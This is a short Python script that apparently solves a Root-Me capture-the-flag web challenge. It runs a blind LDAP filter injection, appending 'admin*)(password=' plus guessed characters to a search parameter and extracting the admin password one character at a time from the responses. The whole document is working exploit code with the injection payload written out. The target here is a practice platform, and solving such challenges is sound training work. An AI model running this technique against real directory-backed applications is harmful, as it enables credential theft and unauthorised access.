import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://challenge01.root-me.org/web-serveur/ch26/?action=dir&search=admin*)(password=" + flag + char)
        if ("admin" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break